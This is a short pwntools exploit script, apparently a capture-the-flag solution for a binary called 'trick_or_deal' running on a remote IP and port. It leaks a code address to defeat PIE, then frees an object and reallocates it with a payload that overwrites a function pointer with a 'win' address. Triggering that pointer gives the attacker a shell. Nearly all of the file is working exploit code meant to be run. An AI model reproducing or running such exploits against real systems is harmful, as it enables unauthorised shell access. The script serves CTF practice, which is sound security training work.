#!/usr/bin/env python3

from pwn import *

exe = ELF("./trick_or_deal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('83.136.250.158',46258)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000EB5
#           brva 0x0000000000001116
#           ''')
input()

def get_shell():
    p.sendlineafter(b'What do you want to do? ',b'1')


def leak():
    p.sendlineafter(b'What do you want to do? ',b'2')
    payload = b'a'*40
    p.sendafter(b'What do you want!!? ',payload)
    p.recvuntil(payload)
    leak = u64(p.recv(6).ljust(8,b'\x00'))
    log.info(f"leak: {hex(leak)}")
    exe.address = leak - 0x1170

    log.info(f"libc: {hex(exe.address)}")
def free_():
    p.sendlineafter(b'What do you want to do? ',b'4')


def make_offer():
    p.sendlineafter(b'What do you want to do? ',b'3')
    p.sendlineafter(b'offer(y/n): ',b'y')
    p.sendafter(b'offer to be? ',str(80))
    p.sendafter(b'offer me? ',b'a'*72 + p64(win))


leak()
one_gadget = libc.address + 0xe3b2e
win = exe.address + 0x0000000000000EFF


log.info(f"og {hex(one_gadget)}")
free_()
make_offer()
get_shell()




p.interactive()
